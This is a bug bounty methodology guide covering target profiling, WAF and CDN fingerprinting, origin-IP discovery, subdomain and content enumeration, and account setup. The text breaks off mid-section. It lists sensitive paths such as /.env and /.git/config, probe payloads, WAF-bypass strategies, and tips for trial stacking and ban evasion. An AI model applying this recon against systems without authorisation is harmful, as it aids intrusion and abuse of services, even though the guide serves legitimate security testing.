# Recon & Preparation

The bridge between finding validation and WAF bypass. This is Part 5 of the 10-part bug bounty methodology series. Proper recon and preparation is what separates hunters who submit one finding per 10 hours from those who submit one per hour.

The time you spend preparing is never wasted. It compounds: every subdomain you find, every wordlist you build, every account you set up — each one is a multiplier on your hunting efficiency. Without preparation, you're guessing. With preparation, you're systematically testing hypotheses.

## Table of Contents

1. [Introduction: Why Recon & Prep Wins Bounties](#introduction-why-recon--prep-wins-bounties)
2. [Target Profiling](#target-profiling)
3. [Scope Mapping](#scope-mapping)
4. [Account Setup](#account-setup)
5. [Tooling Configuration](#tooling-configuration)
6. [Wordlist Generation](#wordlist-generation)
7. [Pre-Hunt Checklist](#pre-hunt-checklist)
8. [Environment Preparation](#environment-preparation)
9. [Monitoring Setup](#monitoring-setup)
10. [Reproducibility Foundations](#reproducibility-foundations)
11. [Pre-Hunt Readiness Checklist](#pre-hunt-readiness-checklist)

---

## Introduction: Why Recon & Prep Wins Bounties

There are two kinds of bug bounty hunters:

**The guesser:** Spends 30 seconds on the target, opens Burp, starts firing payloads at the first endpoint they see. They find nothing for 8 hours, switch targets, and repeat.

**The preparer:** Spends 2-4 hours on recon and setup before sending a single request. They know exactly which subdomains are live, what tech stack is running, where the JS bundles are hiding, and which endpoints are most likely vulnerable. They burn through their hunting time efficiently because every request they send is informed by preparation.

| Metric | Guesser | Preparer |
|--------|---------|----------|
| Findings per 10 hours | 0-1 | 3-8 |
| N/A rate | 40-60% | 5-15% |
| Duplicate rate | 50-70% | 10-20% |
| Critical/High ratio | 5% | 25%+ |
| Time spent on recon | 5% | 40% |
| Tools used | Burp only | Full pipeline |

**The math is simple:** If you spend 4 hours preparing and 4 hours hunting, you get 8 hours of effective hunting because you're working on a primed surface. If you spend 8 hours hunting without prep, you get maybe 2 hours of effective hunting and 6 hours of wandering.

### Why Preparation Catches Bugs That Hunting Misses

1. **You find the attack surface that isn't documented** — sitemaps, hidden subdomains, staging environments, internal APIs, undocumented GraphQL endpoints, cloud storage buckets.

2. **You build targeted wordlists** — generic wordlists hit generic bugs. Custom wordlists built from JS bundles and historical data hit bugs that nobody else tested for.

3. **You know the tech stack before you probe** — knowing it's Django vs Flask vs Express vs Spring changes everything about how you test. The frameworks have specific vulnerabilities, specific parameter handling, specific ORM behaviors.

4. **You can test with proper context** — multiple accounts, different tiers, different roles. Without pre-setup accounts, you're testing blind.

5. **You avoid WAF blocks** — proper rate limiting, proxy rotation, and geo-distributed testing keep you under the radar. WAFs are your enemy; preparation is your armor.

6. **You validate before you hunt** — the pre-hunt checklist catches configuration errors (broken proxies, expired accounts, missing tools) before they waste your hunting session.

### The Cost of Not Preparing

```
Time wasted debugging proxy chain:      30 min
Time wasted because account expired:    15 min
Time wasted because tool not installed: 20 min
Time wasted because scope unclear:      30 min
Time wasted because wordlist wrong:     45 min
Time wasted fixing broken env:          40 min
────────────────────────────────────────────
Total wasted per session:               3 hours
```

At 3 hours wasted per 8-hour session, that's a 37% tax on your hunting time. Over a year of weekend hunting (100 days), that's 300 hours — 12.5 full days — flushed down the drain.

### What This Guide Covers

This document walks through every step of preparation, from target profiling through final checklist. Each section includes real-world examples, tool configurations, and decision frameworks. Follow this guide before every hunting session and your output per hour will double.

---

## Target Profiling

Before you send a single request, you need to know what you're dealing with. Target profiling is the systematic identification of the target's technology stack, infrastructure, and defensive posture.

### 2.1 Tech Stack Identification

You cannot effectively hunt a target without knowing its tech stack. Different technologies have different vulnerability patterns, different bypass techniques, and different high-impact bug classes.

#### Passive Fingerprinting (No Requests to Target)

These tools analyze the target from public data without sending a single request:

```
# Wappalyzer (browser extension)
# Identifies: CMS, frameworks, analytics, CDN, JS libraries
# Best for: initial tech stack overview
# Install: browser extension, CLI via wappalyzer CLI

# BuiltWith (web service + API)
# https://builtwith.com/{target}.com
# Identifies: framework, hosting, CDN, SSL, analytics, widgets
# Best for: deep technology profiling, historical tech changes

# WhatWeb (CLI)
whatweb -a 3 https://target.com
# -a 3 = aggressive (more probes, more info)
# Identifies: web server, framework, CMS, JS libraries, meta tags

# WPScan (if WordPress detected)
wpscan --url https://target.com --enumerate vp,vt,tt,cb,dbe
# vp = vulnerable plugins, vt = vulnerable themes
# tt = timthumbs, cb = config backups, dbe = db exports
```

**What to look for:**

| Technology | What It Reveals | Likely Bug Classes |
|------------|-----------------|-------------------|
| WordPress | WP version, plugins, themes, users | SQLi, XSS, RCE via outdated plugins, LFI, auth bypass |
| Django | DRF, template engine, auth backend | Mass assignment, IDOR, SSTI, SQLi |
| Rails | ActiveRecord, asset pipeline, turbolinks | Mass assignment, YAML deserialization, SQLi |
| Express/Node | Middleware stack, templating, auth libs | Prototype pollution, RCE, SSRF |
| Spring Boot | Actuator, JPA, security config | Actuator leaks, SpEL injection, IDOR |
| ASP.NET | ViewState, MVC version, WebForms | ViewState deserialization, machineKey attacks |
| React/Angular/Vue | SPA framework, state management | Client-side bugs, API surface exposure |
| Nginx/Apache/IIS | Web server version, modules | Path traversal, request smuggling, info disclosure |

#### Server Headers Analysis

Server headers tell you more than most tools:

```http
HTTP/1.1 200 OK
Server: nginx/1.24.0
X-Powered-By: Express
X-Frame-Options: SAMEORIGIN
Set-Cookie: session=abc123; HttpOnly; Secure; SameSite=Lax
X-Content-Type-Options: nosniff
Strict-Transport-Security: max-age=31536000
Content-Security-Policy: default-src 'self'
```

**Header analysis checklist:**

| Header | What It Tells You | What to Check |
|--------|-------------------|---------------|
| `Server` | Web server + version | Known CVEs for that version |
| `X-Powered-By` | Framework + version | Framework-specific bugs |
| `Set-Cookie` | Session format, attributes | Predictability, HttpOnly, SameSite |
| `X-AspNet-Version` | ASP.NET version | ViewState machineKey attacks |
| `X-AspNetMvc-Version` | MVC version | Routing bugs, controller exposure |
| `X-Drupal-Cache` | Drupal | Drupalgeddon variants |
| `X-Varnish` / `Age` | Caching infrastructure | Cache poisoning, cache-based data leaks |
| `CF-*` headers | Cloudflare | WAF bypass, origin IP discovery |
| `Akamai-*` headers | Akamai | WAF bypass, origin exposure |
| `x-amz-*` headers | AWS | S3, CloudFront, Lambda exposure |
| `via` header | Proxy/CDN | CDN fingerprinting |
| `X-Served-By` | Load balancer target | Internal hostnames |
| `X-Request-ID` | Request tracing | Internal ID format, predictability |

**Automated header collection:**

```bash
# Collect headers from multiple endpoints
curl -sI https://target.com | grep -iE '^(server|x-powered|x-aspnet|cf-ray|x-drupal)'
curl -sI https://target.com/api | grep -iE '^(server|x-powered)'
curl -sI https://target.com/login | grep -iE '^(set-cookie|server|x-powered)'

# Full header dump for analysis
curl -s -D - https://target.com -o /dev/null | tee headers.txt

# Check for security headers
curl -sI https://target.com | grep -iE '^(content-security-policy|x-frame-options|strict-transport-security|x-content-type-options|referrer-policy|permissions-policy)'
```

#### Framework Fingerprinting

Framework fingerprinting goes beyond what headers reveal. Every framework has unique behaviors, response patterns, and error pages.

**Error-based fingerprinting:**

```bash
# Trigger framework-specific errors
curl -s https://target.com/nonexistent-route  # 404 page style
curl -s https://target.com/api/nonexistent     # JSON error format
curl -s -X POST https://target.com/login       # CSRF token format
curl -s "https://target.com/?__debug=1"         # Debug mode
curl -s "https://target.com/?XDEBUG_SESSION=1"  # XDebug enable
curl -s -H "X-Debug: 1" https://target.com     # Debug header
curl -s -H "Accept: text/html" https://target.com/api/users  # Content negotiation
```

**Framework detection by response patterns:**

| Framework | Telltale Signs |
|-----------|---------------|
| Django | CSRF token format: `csrfmiddlewaretoken` in forms, `csrftoken` cookie, `X-Frame-Options: DENY` |
| Rails | CSRF token format: `<meta name="csrf-param"`, `authenticity_token` param, session in `_session_id` |
| Express | `X-Powered-By: Express`, default 404: `Cannot GET /path`, `connect.sid` cookie |
| Spring Boot | `/actuator/health`, `/error` stack traces, `X-Application-Context` header |
| Laravel | `laravel_session` cookie, `XSRF-TOKEN` cookie, Blade template compile errors |
| Flask | Session cookie (`session=<base64>`), Jinja2 error templates, Werkzeug debugger |
| ASP.NET | `__VIEWSTATE` hidden field, `__EVENTVALIDATION`, `X-AspNet-Version` |
| Ruby on Rails | `_session_id` cookie, `.erb` template errors, `Rack` header hints |
| FastAPI/Pydantic | Detailed validation errors in JSON, OpenAPI schema at `/docs` or `/openapi.json` |
| Gin (Go) | Default 404: `404 page not found`, JSON responses with `{"error":"..."}` |

**Case study: Framework tells that led to a critical bug**

> *"I was profiling a target and noticed the 404 page returned a Jinja2-style error (File "<template>", line 1...). This told me it was Python + Jinja2. I immediately tested for SSTI on every input field. On the third endpoint (a search bar), `{{7*7}}` returned `49` in the error message. That SSTI led to RCE via Jinja2 class walker. P1 bounty: $15,000."*
>
> — Anonymous H1 hunter, 2025

#### CDN/WAF Detection

Before active testing, you must know what defensive layers sit in front of the target. This determines your rate limiting, proxy strategy, and bypass approach.

**CDN detection:**

```bash
# DNS resolution reveals CDN
nslookup target.com
# Cloudflare → 104.x.x.x, 172.x.x.x
# Akamai → 23.x.x.x, 96.x.x.x  
# Fastly → 151.101.x.x
# CloudFront → cloudfront.net hostname
# Cloudflare → target.com.cdn.cloudflare.net

# Check for CDN-specific headers
curl -sI https://target.com | findstr /I "cf-ray cf-cache-status cf-request-id server"
curl -sI https://target.com | findstr /I "x-amz-cf-id x-amz-cf-pop x-edge-*"
curl -sI https://target.com | findstr /I "x-cache x-served-by x-cache-hits"

# Origin IP discovery (critical for WAF bypass)
# Try historical DNS records
curl -s "https://api.securitytrails.com/v1/history/target.com/dns/a" \
     -H "APIKEY: your-key" | jq '.records[].organizations'
```

**WAF fingerprinting:**

```bash
# Trigger WAF with suspicious payload
curl -s "https://target.com/?q=<script>alert(1)</script>" -o /dev/null -w "%{http_code}"
# 403, 406, 451, 999 → WAF blocked
# 200 → No WAF or payload bypassed

# Check response body for WAF branding
curl -s "https://target.com/?q=<script>" | findstr /I "cloudflare akamai sucuri mod_security aws waf barracuda imperva"
```

**WAF identification table:**

| WAF Provider | Response Indicators | Block Codes | Bypass Strategy |
|-------------|-------------------|-------------|-----------------|
| Cloudflare | `CF-*` headers, `Access Denied` page | 403, 503 | Origin IP discovery, payload encoding, HTTP/2 downgrade |
| Akamai | `Akamai-*` headers, `Reference #` in body | 403 | Edge-scape bypass, parameter pollution |
| AWS WAF | `x-amzn-*` headers, `RequestBlocked` | 403, 400 | Rate limiting, payload splitting |
| ModSecurity | `Mod_Security` in `Server` header | 406, 406 | Rule-specific bypasses |
| F5/BigIP | `BigIP` in `Server` or cookies | 403 | Case tampering, encoding tricks |
| Sucuri | `X-Sucuri-*`, `Sucuri` in body | 403 | Origin IP, HTTP/2 to HTTP/1.1 downgrade |
| Imperva/Incapsula | `X-Iinfo` header, `Incapsula` in body | 403 | Timing attacks, IP rotation |
| Barracuda | `Barracuda` in block page | 403 | URL encoding, parameter manipulation |

**Origin IP discovery techniques:**

```bash
# 1. Historical DNS via SecurityTrails
# 2. Certificate Transparency logs (crt.sh)
# 3. MX records (often point to origin)
# 4. TXT records (SPF includes origin IPs)
# 5. Subdomain with different CDN
# 6. favicon.ico from origin (if CDN misconfigured)
# 7. Direct IP connection (try all resolved IPs)
# 8. CloudFail (tool for Cloudflare origin bypass)

# crt.sh query
curl -s "https://crt.sh/?q=%25.target.com&output=json" | jq -r '.[].name_value' | sort -u

# MX record retrieval
nslookup -type=MX target.com

# SPF record parsing  
nslookup -type=TXT target.com | findstr "spf"
# spf includes IP ranges - check if they host the web server
```

**Rate limit discovery:**

```bash
# Determine WAF rate limit thresholds
for i in {1..100}; do
    curl -s -o /dev/null -w "Request $i: %{http_code}\n" https://target.com/api/test
done

# If you get 429/403 after N requests, you know the limit
# Common limits: 10/min, 30/min, 100/min, 1000/min
# Reset intervals: 1min, 5min, 15min, 1hour
```

---

## Scope Mapping

Scope mapping is the systematic discovery of the target's attack surface. Every subdomain, every host, every port, every endpoint — this is your battlefield map. Without it, you're fighting blind.

### 3.1 Subdomain Enumeration

Subdomain enumeration finds hidden attack surface. Staging environments, internal tools, admin panels, development servers — these are almost always on subdomains that aren't linked from the main site.

#### Passive Subdomain Enumeration

```bash
# Subfinder (multiple sources)
subfinder -d target.com -o subfinder.txt
# Sources: CertSpotter, crt.sh, DNSDumpster, ThreatMiner, VirusTotal, Shodan, etc.

# ChaOS (Certificate Transparency)
chaos -d target.com -o chaos.txt

# Amass (passive mode)
amass enum -passive -d target.com -o amass_passive.txt

# Assetfinder
assetfinder --subs-only target.com | tee assetfinder.txt

# crt.sh direct query
curl -s "https://crt.sh/?q=%25.target.com&output=json" | jq -r '.[].name_value' | sort -u > crtsh.txt

# SecurityTrails API
curl -s "https://api.securitytrails.com/v1/domain/target.com/subdomains" \
     -H "APIKEY: your-key" | jq -r '.subdomains[]' | awk '{print $0".target.com"}' > strails.txt
```

**Source comparison: which source finds what:**

| Source | Coverage | Freshness | Notes |
|--------|----------|-----------|-------|
| crt.sh | Medium | Days to months | Good for SSL-validated domains |
| SecurityTrails | High | Hours to days | Paid API for full access |
| ChaOS | Medium | Realtime | Best for newly issued certs |
| VirusTotal | High | Variable | Requires API key |
| Shodan | High | Days | Best for internet-exposed services |
| DNSDumpster | Low | Months | Good visual map output |
| AlienVault OTX | Medium | Days | Good for historical data |
| ThreatMiner | Low | Variable | Good for threat intel |
| Riddler.io | Medium | Days | Paid service |
| Sublist3r | Medium | Months | Aggregates multiple sources |
| Findomain | High | Realtime | Token-based, high coverage |

#### Active Subdomain Enumeration

```bash
# Amass (active mode)
amass enum -active -d target.com -o amass_active.txt

# DNS brute force with common wordlist
dnsx -d target.com -w subdomains-top1million-5000.txt -o dnsx_brute.txt

# MassDNS (fast DNS resolver)
massdns -r resolvers.txt -t A -o S -w massdns_output.txt subdomain_list.txt

# Puredns (wildcard filtering)
puredns bruteforce subdomains-top1million-20000.txt target.com -r resolvers.txt -w puredns_output.txt
```

**Wordlists for subdomain brute force:**

| Wordlist | Size | Coverage |
|----------|------|----------|
| `subdomains-top1million-5000.txt` (SecLists) | 5K | Common patterns |
| `subdomains-top1million-20000.txt` (SecLists) | 20K | Moderate coverage |
| `commonspeak2-subdomains.txt` | 40K | Tech-specific patterns |
| `best-dns-wordlist-1m.txt` | 1M | Maximum coverage |
| `jhaddix-all.txt` | 2M | Exhaustive |

**Wildcard detection and handling:**

```bash
# Check if domain uses wildcard DNS
nslookup randomstringthatnooneuses12345.target.com
# If it resolves (returns an IP), wildcard DNS is in use

# Filter wildcards with dnsx
dnsx -d target.com -w wordlist.txt -wd -o filtered.txt
# -wd = wildcard detection

# Manual wildcard filter
massdns -r resolvers.txt -t A -o S -w output.txt subdomains.txt
awk '$2 == "A" && $3 !~ /^127\./ && $3 !~ /^10\./' output.txt | sort -u
```

**Real-world case: Hidden subdomain found via CT logs**

> *"I was profiling a large SaaS and ran crt.sh for the target. Among the standard subdomains (www, api, app, mail), I found `staging-2024-api.target.com` and `admin-console.internal.target.com`. The first was a staging environment running an outdated version of the API with no rate limiting. The second had a default login page with `admin/admin` credentials. Combined, I had admin access to the staging API. No bounty — but the insight into their admin API structure helped me find an IDOR on production within 30 minutes."*
>
> — H1 Top 100 hunter, public write-up

### 3.2 Live Host Discovery

Subdomain lists are full of dead hosts, parked domains, and stale DNS records. You need to filter for live, responsive hosts.

```bash
# httpx (HTTP probe)
cat subdomains.txt | httpx -o live_hosts.txt
# -sc = status code, -ct = content type, -title = page title, -web-server
# -tech-detect = technology detection

# Advanced httpx usage
cat subdomains.txt | httpx -sc -ct -title -web-server -tech-detect -ip -cl -o advanced_scan.txt

# dnsx (DNS probe)
cat subdomains.txt | dnsx -a -o resolved_hosts.txt

# Combine: verify DNS resolves AND HTTP responds
cat subdomains.txt | dnsx -a | httpx -o live_with_resolved.txt
```

**Response analysis output format:**

```
https://admin.target.com [200] [text/html] [Admin Panel - Login] [nginx/1.24.0]
https://api.target.com [200] [application/json] [API v2] [Apache/2.4.41]
https://staging.target.com [302] [text/html] [Staging - Redirect] [nginx/1.22.0]
https://cdn.target.com [403] [text/html] [Forbidden] [Cloudflare]
https://mail.target.com [200] [text/html] [Roundcube Webmail] [Apache]
https://dev.target.com [401] [text/html] [401 Unauthorized] [nginx]
https://docs.target.com [200] [text/html] [Developer Docs] [GitHub Pages]
https://status.target.com [200] [application/json] [Status Page] [nginx]
https://partner.target.com [200] [text/html] [Partner Login] [IIS/10.0]
https://graphql.target.com [200] [application/json] [GraphQL IDE] [Express]
```

**Prioritization matrix for live hosts:**

| Priority | Host Type | Why Hunt Here |
|----------|-----------|--------------|
| P0 | API subdomains | Direct data access, auth bypass, IDOR |
| P0 | Admin panels | Privilege escalation, mass data access |
| P0 | GraphQL endpoints | Introspection, batching, resolver bugs |
| P1 | Staging/Dev | Weaker security, outdated versions |
| P1 | Partner portals | Different auth flow, SSO bugs |
| P1 | Legacy subdomains | Unpatched, forgotten, misconfigured |
| P2 | CDN/Static | CORS, cache poisoning, origin bypass |
| P2 | Documentation | API key leaks, endpoint references |
| P3 | Blog/Marketing | Low priority, but check for CMS bugs |
| P3 | Status page | Info disclosure, stack info |

### 3.3 Port Scanning

Not all attack surface is on ports 80 and 443. Port scanning reveals admin panels, databases, monitoring tools, and alternative services.

```bash
# Naabu (fast port scanner)
naabu -host target.com -p - -rate 1000 -o naabu_full.txt
# -p - = all ports (slow but thorough)
# Common fast scan: -p 80,443,8080,8443,3000,5000,8000,9000

# Naabu with service detection
naabu -host target.com -p 1-10000 -rate 500 -o naabu_ports.txt | httpx -o naabu_services.txt

# Masscan (fastest, requires sudo)
masscan target.com -p1-65535 --rate=10000 -oJ masscan.json

# Nmap service detection on open ports (more detailed)
# nmap -sV -p 80,443,8080,8443,3000 target.com
```

**High-value ports to check:**

| Port | Service | What to Look For |
|------|---------|-----------------|
| 22 | SSH | Version, banner, default creds |
| 25/587 | SMTP | Open relay, version |
| 53 | DNS | Zone transfer, recursion |
| 110/995 | POP3 | Version, auth bypass |
| 143/993 | IMAP | Version, auth bypass |
| 389/636 | LDAP | Anonymous bind, enumeration |
| 445 | SMB | Null session, SMBGhost |
| 8080 | HTTP proxy | Open proxy, alternative web server |
| 8443 | HTTPS alt | Admin panel, API alt port |
| 27017 | MongoDB | No auth, exposed data |
| 6379 | Redis | No auth, RCE via cron |
| 9200 | Elasticsearch | No auth, data dump |
| 5432 | PostgreSQL | Exposed, default creds |
| 3306 | MySQL | Exposed, default creds |
| 3389 | RDP | BlueKeep, creds |
| 9090 | Prometheus | Metrics exposure |
| 3000 | Grafana | Default creds, dashboard access |
| 5000 | Flask dev | Debug mode, Werkzeug console |
| 9000 | Portainer | Docker management, default creds |
| 8086 | InfluxDB | No auth, time series data |
| 9092 | Kafka | No auth, message streams |
| 2375 | Docker API | No auth, container escape |
| 60000-61000 | Kubernetes | kubelet, etcd, API server |

### 3.4 Screenshotting

Screenshots turn raw host lists into visual reconnaissance. A single screenshot can tell you more than 10 curl commands.

```bash
# Aquatone (classic)
cat live_hosts.txt | aquatone -out screenshots/ -threads 5

# Gowitness (modern, faster)
gowitness file -f live_hosts.txt --destination screenshots/

# EyeWitness (detailed)
eyewitness -f live_hosts.txt -d screenshots/ --no-prompt
```

**What to look for in screenshots:**

- **Login pages** — framework identification by login form style
- **Admin panels** — direct access to sensitive functionality
- **Error pages** — framework version, debug info, stack traces
- **Default pages** — untouched installations, default credentials
- **APIs** — Swagger UI, GraphQL playground, API documentation
- **DevOps tools** — Jenkins, Grafana, Kibana, Portainer
- **Unusual content** — anything that doesn't match the main app

**Screenshot triage workflow:**

1. Open screenshots directory sorted by date
2. Quickly scan for login pages (admin panels)
3. Identify tech stack from visual patterns
4. Flag any page with obvious version numbers
5. Look for "welcome" or "getting started" pages (fresh installs)
6. Note any page with debug/diagnostic information
7. Check for mobile/API documentation pages

### 3.5 Content Discovery

Content discovery finds hidden endpoints, directories, and files. This is where the high-impact findings live.

```bash
# ffuf (fast web fuzzer) - directory discovery
ffuf -u https://target.com/FUZZ -w directory-list-2.3-medium.txt -o ffuf_dirs.json

# ffuf - file discovery
ffuf -u https://target.com/FUZZ -w raft-large-files.txt -o ffuf_files.json

# ffuf - extension-specific
ffuf -u https://target.com/FUZZ -w directory-list-2.3-small.txt -e .php,.asp,.aspx,.jsp,.json,.xml,.yaml,.env -o ffuf_ext.json

# ffuf - parameter discovery
ffuf -u https://target.com/api/FUZZ -w params.txt -o ffuf_params.json

# dirsearch (alternative)
dirsearch -u https://target.com/ -e php,asp,aspx,jsp,json,xml -t 50

# gobuster (if ffuf unavailable)
gobuster dir -u https://target.com/ -w directory-list-2.3-medium.txt -t 50
```

**ffuf configuration best practices:**

```bash
# Rate limited ffuf (respect the target)
ffuf -u https://target.com/FUZZ \
     -w wordlist.txt \
     -t 10 \                    # Threads
     -rate 30 \                 # Requests per second
     -fc 403,429 \              # Filter these status codes
     -fs 0,1234 \               # Filter by response size
     -fw 0,50 \                 # Filter by word count
     -fl 0,10 \                 # Filter by line count
     -recursion \               # Recursive directory discovery
     -recursion-depth 2 \       # Max recursion depth
     -maxtime 600 \             # Max time in seconds
     -o results.json \          # Output file
     -of json                   # Output format
```

**Content discovery wordlists by purpose:**

| Purpose | Wordlist | Size |
|---------|----------|------|
| General directories | `directory-list-2.3-medium.txt` | 220K |
| General files | `raft-large-files.txt` | 400K |
| Common paths | `common.txt` | 4.7K |
| API endpoints | `api-endpoints.txt` | 3K |
| Admin paths | `admin-paths.txt` | 2K |
| PHP files | `raft-large-php.txt` | 15K |
| ASP files | `raft-large-asp.txt` | 14K |
| JSP files | `raft-large-jsp.txt` | 3K |
| Backup files | `backup-files.txt` | 500 |
| Config files | `configuration-files.txt` | 200 |
| Sensitive files | `sensitive-files.txt` | 100 |
| Tech-specific | `technology/*.txt` | Varies |

**High-value endpoints to always check:**

```
/robots.txt
/sitemap.xml
/.env
/.git/config
/.gitignore
/admin
/api
/api/v1
/api/v2
/graphql
/swagger
/swagger.json
/swagger/v1/swagger.json
/openapi.json
/health
/actuator
/actuator/health
/actuator/info
/actuator/env
/actuator/beans
/debug
/console
/manager
/websocket
/sockjs
/sockjs-node
/info
/status
/metrics
/prometheus
/crossdomain.xml
/clientaccesspolicy.xml
/phpinfo.php
/info.php
/test
/dev
/staging
/sandbox
/internal
/partner
/webhook
/callback
/.well-known/security.txt
```

**Content discovery real-world find:**

> *"While running ffuf on a target, I found `/internal-api-docs/` with a 200 response. The directory listing was enabled. It contained a Swagger JSON file for the internal API — endpoints like `/admin/users/impersonate`, `/internal/reports/all`, `/admin/config/update`. Each endpoint had the exact request format documented. I used the Swagger file as my attack blueprint for the next 2 hours."*
>
> — Public bug bounty write-up, 2025

---

## Account Setup

Multiple properly-configured accounts are the engine of effective bug bounty hunting. You cannot test authorization bugs, IDORs, or privilege escalation with a single account.

### 4.1 Multi-Account Strategies

You need at least 3-4 accounts per target battle station:

| Account | Type | Purpose |
|---------|------|---------|
| Account A | Free/regular user | Baseline testing, low-privilege access |
| Account B | Free/regular user (alt email) | Cross-user testing (IDOR, horizontal) |
| Account C | Premium/subscribed | Test premium-only features, privilege escalation |
| Account D | Admin (if accessible) | Test admin endpoints, vertical priv esc |

**Free tier limitations workaround:**

Most targets limit free accounts. Strategies to get premium access:

```
1. Trial stacking:
   - Sign up with different emails, same card
   - Stagger trials so one is always active
   - Use virtual cards (Privacy.com, Revolut)

2. Educational/student plans:
   - Many SaaS offer free student plans with premium features
   - GitHub Student Developer Pack (free)

3. Partner/affiliate programs:
   - Some targets give partner accounts to security researchers
   - Check if the program has a researcher access program

4. Open source/community editions:
   - Self-hosted versions may have full feature sets
   - Test the self-hosted version, extrapolate to cloud

5. Referral programs:
   - Some platforms give credits for referrals
   - Create referral chains
```

**Email aliasing strategies:**

```bash
# Gmail (unlimited aliases with +)
user+target1@gmail.com
user+target2@gmail.com
# Gmail also ignores dots: u.s.e.r@gmail.com = user@gmail.com

# Custom domain catch-all
# Set up a catch-all on your domain
hunt1@yourdomain.com
hunt2@yourdomain.com
hunt3@yourdomain.com

# Temp mail (use with caution)
# 10minutemail, Guerrilla Mail, Temp Mail
# Risk: accounts may be reclaimed

# SimpleLogin / Firefox Relay
# Creates aliases that forward to your real inbox
# Can reply from alias
# Paid plans: unlimited aliases

# Addy.io (anonaddy)
# Similar to SimpleLogin, self-hostable
```

**Phone number strategies (for targets that require SMS):**

```bash
# Google Voice (US only, free)
# One number, but can receive SMS

# TextVerified / SMSPool / 5SIM
# Virtual SMS verification services
# Pay per SMS received (~$0.10-0.50)
# Wide country coverage

# Twilio (programmatic)
# Buy a number, forward SMS to webhook
# Can script account creation

# Physical SIM + GSM modem
# Most reliable but most expensive
# Use old phones or USB GSM modems
```

**Account creation discipline:**

```bash
# Create a standardized naming scheme
# Account A: hunter1+targetname@domain.com
# Account B: hunter2+targetname@domain.com  
# Account C: hunter3+targetname@domain.com

# Store credentials in a password manager
# Bitwarden, 1Password, KeePassXC
# Use folder structure: Targets > TargetName > Accounts

# Document each account's state:
# - Account type (free/premium/admin)
# - Date created
# - Trial expiration
# - API keys generated
# - Premium features accessible
# - Team/org created
```

### 4.2 Account Fingerprinting

Understanding how the server identifies and tracks your account is critical for anti-fingerprinting and session persistence.

```bash
# Map all identifiers associated with your account
# Session cookies
# JWT tokens
# API keys
# User IDs
# Account IDs
# Team/org IDs
# Device fingerprints
# IP-based tracking
```

**Fingerprinting detection checklist:**

| What to Check | How to Check | Why It Matters |
|--------------|-------------|----------------|
| Session cookie format | Decode JWT, inspect cookie string | Predictability, forgery potential |
| Cookie attributes | HttpOnly, Secure, SameSite | XSS protection quality |
| Cookie domain/scope | Which subdomains share cookies | Subdomain takeover impact |
| Local storage | `window.localStorage` in browser console | JWT storage, API keys |
| Session ID length | Count characters | Entropy estimation |
| Session ID change | Login/logout multiple times | Rotation patterns |
| Device fingerprint | Check for fingerprinting JS | Ban-evasion difficulty |
| IP tracking | Access from different IPs | VPN/proxy detection |
| Browser fingerprint | Access from different browsers | Ban evasion |
| User agent tracking | Change UA, check if session invalidated | Bot detection |

**Example: JWT fingerprinting:**

```javascript
// Decode your JWT
// Header:
{
  "alg": "RS256",
  "typ": "JWT",
  "kid": "key-2024-01"
}

// Payload:
{
  "sub": "user_abc123",
  "email": "hunter1@domain.com",
  "iat": 1718563200,
  "exp": 1718649600,
  "role": "free",
  "org_id": "org_xyz789",
  "session_id": "sess_def456"
}
```

**What to note:**
- `role` field — can you modify it? (mass assignment)
- `sub` format — predictable or UUID? Can you guess other users?
- `kid` — path traversal potential if used in key lookup
- `session_id` — track across requests, check for re-use

### 4.3 Session Persistence

Session persistence means your hunting session doesn't break because your token expired or your session was invalidated.

```bash
# JWT token refresh strategy
# 1. Run a background refresh loop
while ($true) {
    Start-Sleep -Seconds 300  # 5 min refresh
    $response = curl -s -X POST https://target.com/api/auth/refresh `
        -H "Authorization: Bearer $token"
    $token = ($response | ConvertFrom-Json).token
}

# 2. Store token in environment variable
$env:HUNTING_TOKEN = "eyJhbGciOi..."

# 3. Use a token manager script
# tokens.json contains {"target.com": {"user_a": "token", "user_b": "token"}}
```

**Session persistence checklist:**

- [ ] JWT refresh mechanism configured
- [ ] Session cookie expiration monitored
- [ ] Token auto-refresh on 401 detection
- [ ] All accounts have fresh tokens
- [ ] Session not tied to specific IP
- [ ] API keys rotated recently (not expired)
- [ ] Premium trial not expired

### 4.4 API Key Generation

Each account should have API keys generated and stored for automated testing.

```
# Generate API keys for each account
# Store in structured format:

target_api_keys.json:
{
  "target.com": {
    "free_user_a": {
      "key": "sk_live_abc123",
      "secret": "whsec_xyz789",
      "created": "2026-06-10",
      "scopes": ["read", "write"],
      "rate_limit": "100/min"
    },
    "premium_user_c": {
      "key": "sk_live_def456",
      "secret": "whsec_uvw012",
      "created": "2026-06-12",
      "scopes": ["read", "write", "admin"],
      "rate_limit": "1000/min"
    }
  }
}
```

**What API keys grant access to:**

- Direct API access (no browser needed)
- Webhook management
- Team/org administration
- Export functionality
- Third-party integrations
- Batch operations
- Higher rate limits

---

## Tooling Configuration

Tools are only as good as their configuration. A poorly configured Burp will miss endpoints, a misconfigured proxy chain will get you blocked, and a wrong wordlist will waste hours.

### 5.1 Burp Suite Project Setup

Burp Suite is the center of your hunting workflow. A properly configured project saves hours per session.

```bash
# Project file management
# Create separate project files per target
Burp_Projects/
  target1/
    target1_2026-06-16.burp
    target1_scope.json
    target1_session/
  target2/
    target2_2026-06-16.burp
    target2_scope.json
    target2_session/
```

**Burp configuration checklist:**

```
1. Scope Configuration:
   - Add all in-scope subdomains to scope
   - Enable "Use advanced scope control"
   - Add out-of-scope exclusions (CDNs, third-party)
   - Enable "Only show items in scope"

2. Target Scope:
   Protocol: Any  Host or IP range: *.target.com
   Port: Any  File: Any
   
   Exclude from scope:
   Protocol: Any  Host or IP range: *.cdn.target.com
   Protocol: Any  Host or IP range: *.3rdparty.com
   Protocol: Any  Host or IP range: analytics.target.com

3. Session Handling Rules:
   - Add Cookie Jar for each account
   - Configure macro for login/refresh
   - Set session handling scope to in-scope only

4. Proxy Listener:
   - Default: 127.0.0.1:8080
   - Secondary: 127.0.0.1:8081 (for headless browsers)
   - Enable invisible proxying for non-proxy-aware tools

5. Extensions (must-have):
   - Logger++ (request logging)
   - Autorize (authorization testing)
   - Authmatrix (role testing)
   - Turbo Intruder (race conditions, rate testing)
   - Param Miner (parameter discovery)
   - Backslash Powered Scanner (SSTI, injections)
   - Collaborator Everywhere (blind SSRF, XXE)
   - JS Miner (JS endpoint extraction)
   - JSON Web Tokens (JWT manipulation)

6. Intruder Configuration:
   - Default resource pool: 1 thread, 1s delay
   - Turbo pool: 10 threads, no delay
   - Grep-Extract rules for common patterns

7. Repeater Configuration:
   - Update Content-Length automatically
   - Unpack gzip/deflate
   - Follow redirects: On-site only
```

**Scope export/import format:**

```json
{
  "scope": {
